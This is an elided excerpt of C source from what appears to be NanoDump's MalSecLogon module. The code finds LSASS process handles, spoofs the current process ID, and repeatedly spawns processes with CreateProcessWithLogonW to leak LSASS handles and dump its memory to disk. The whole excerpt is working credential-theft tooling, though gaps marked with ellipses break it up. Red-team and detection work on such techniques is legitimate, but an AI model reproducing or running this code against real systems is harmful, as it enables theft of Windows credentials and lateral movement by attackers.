...
PHANDLE_LIST find_process_handles_in_lsass(DWORD lsass_pid)
{
	BOOL success;
	...
	for (ULONG j = 0; j < handleTableInformation->Count; j++)
	{
		...
		if ((handleInfo->GrantedAccess & (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ)) != (PROCESS_QUERY_INFORMATION | PROCESS_VM_READ))
			continue;
...
void change_pid(DWORD new_pid, PDWORD previous_pid)
{
	...
	DPRINT("Changing the current PID from %ld to %ld", current_pid, new_pid);
	if (previous_pid)
...
void set_command_line(BOOL use_malseclogon_locally, LPWSTR command_line, LPCSTR program_name, LPCSTR dump_path, BOOL fork_lsass, BOOL use_valid_sig)
{
	// program path
...
BOOL check_if_succeded(DWORD new_pid, LPCSTR dump_path)
{
	...
	HANDLE hSpoofedProcess = get_process_handle(new_pid, SYNCHRONIZE, FALSE);
	if (!hSpoofedProcess)
		return FALSE;
...
void kill_created_processes(PPROCESS_LIST created_processes)
{
	...
	DPRINT("Killing the %ld created processes", created_processes->Count);
...
BOOL malseclogon_stage_1(LPCSTR program_name, LPCSTR dump_path, BOOL fork_lsass, BOOL use_valid_sig, BOOL use_malseclogon_locally, DWORD lsass_pid, PPROCESS_LIST process_list)
{
	BOOL success;
	...
	set_command_line(use_malseclogon_locally, command_line, program_name, dump_path, fork_lsass, use_valid_sig);

	handle_list = find_process_handles_in_lsass(lsass_pid);
	if (!handle_list)
	{
		DPRINT_ERR("Failed to get handle to " LSASS " using MalSecLogon");
		return FALSE;
	...
	{
		PRINT_ERR("No handles found in " LSASS ", is the PID %ld correct?.", lsass_pid);
		intFree(handle_list);
		handle_list = NULL;
		return FALSE;
	}
	...
	CreateProcessWithLogonW = (CreateProcessWithLogonW_t)get_function_address(get_library_address(ADVAPI32_DLL, TRUE), CreateProcessWithLogonW_SW2_HASH, 0);
	...
	DPRINT("Got address of CreateProcessWithLogonW: 0x%p", (PVOID)CreateProcessWithLogonW);
	...
	while (handles_leaked < handle_list->Count)
	{
		...
		success = CreateProcessWithLogonW(L"NanoDumpUser", L"NanoDumpDomain", L"NanoDumpPwd", LOGON_NETCREDENTIALS_ONLY, filename, command_line, 0, NULL, NULL, &startInfo, &procInfo);
		if (!success)
		{
		...
		DPRINT("Created new process '%ls' (PID: %ld) with CreateProcessWithLogonW to leak process handles from lsass: 0x%lx 0x%lx 0x%lx", filename, procInfo.dwProcessId, (DWORD)(ULONG_PTR)startInfo.hStdInput, (DWORD)(ULONG_PTR)startInfo.hStdOutput, (DWORD)(ULONG_PTR)startInfo.hStdError);
		...
		if (use_malseclogon_locally)
		{
			success = check_if_succeded(procInfo.dwProcessId, dump_path);
			if (success)
			{
				DPRINT("The dump was succesfully created at %s", dump_path);
				change_pid(original_pid, NULL);
				intFree(handle_list);
				handle_list = NULL;
				return TRUE;
	...
	else
	{
		...
		DPRINT("Created %ld processes, trying to duplicate one of the leaked handles to " LSASS, process_list->Count);
		return TRUE;
	}
}
